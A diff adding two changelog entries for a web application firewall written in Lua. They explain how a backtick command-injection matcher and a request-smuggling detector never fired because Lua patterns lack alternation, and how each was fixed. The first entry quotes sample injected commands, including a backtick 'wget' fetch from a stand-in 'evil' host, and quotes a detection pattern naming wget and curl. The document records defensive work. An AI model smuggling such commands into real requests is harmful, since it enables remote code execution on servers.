@@ -43,6 +43,19 @@ back-filled here — see the git/PR history for that period.
   is unchanged. Mirrors the role-keyed `scopedMySQLFilterHandler` / `vhostAllowed`
   guards; added to `docs/endpoint_scope_inventory.md`. Found by the 2026-07 edge
   Lua audit.
+- **WAF (rule 317, `WAF_CMD_PAYLOAD:PAY_BACKTICK`, challenge): fixed a dead
+  backtick-RCE matcher that let most backtick command substitutions through.**
+  The command allowlist was written `inner:match("^%s*(wget|curl|…)%f[^%a]")`,
+  but **Lua patterns have no `(a|b|c)` alternation** — that group matched the
+  literal string `wget|curl|…`, so it never fired. Only the adjacent
+  `;`/`|`/`&&`-inside-backticks branch worked, so `` `wget http://evil/x` ``,
+  `` `id` ``, `` `whoami` `` (no shell metachar) passed unchallenged. The leading
+  token inside the backticks is now captured (`^%s*(%a+)`) and tested against a
+  command set, so a full word must match exactly (`` `category` `` ≠ `cat`). It
+  scans query args only, the search-field carve-out (q/s/term/search/query) is
+  preserved, and the tier stays **challenge** (no block/ban). Covered by
+  `scripts/tests/cfm_waf_backtick_smuggling_test.lua`. Found by the 2026-07 edge
+  Lua audit (F05).
 
 ### Added
 - **Web detector observability:** per-IP / subnet challenge **issuance** is now
@@ -71,6 +84,16 @@ back-filled here — see the git/PR history for that period.
   tcp socket read timed out" seen under only modest load. No behaviour change for
   non-empty responses (decision JSON, chunked). Found by the 2026-07 edge Lua
   audit (F04).
+- **WAF (rule 606, `WAF_HTTP_SMUGGLING`, logonly): the request-line-smuggling
+  detector never fired.** It was doubly dead: the verb match used
+  `sl:match("(get|post|…)…")` (Lua has no `|` alternation, so it matched the
+  literal string), AND the pre-filter tested the raw string for lowercase
+  `" http/"` while a smuggled request line is normally uppercase
+  `"GET … HTTP/1.1"`. The string is now lowercased first, then each known method
+  is tested at a word boundary (`%f[%a]verb%s+[^%s]+%s+http/%d`). Stays
+  **logonly** (observe-only). Covered by
+  `scripts/tests/cfm_waf_backtick_smuggling_test.lua`. Found by the 2026-07 edge
+  Lua audit (F12).
 - **Web detector:** machine-to-machine API endpoints are no longer caught by a
   *vhost-wide* challenge. When a vhost trips the auto-suspicious-vhost score
   (`CHALLENGE_SUSPICIOUS_VHOST_SCORE` / `CHALLENGE_VHOST`), **every** request to
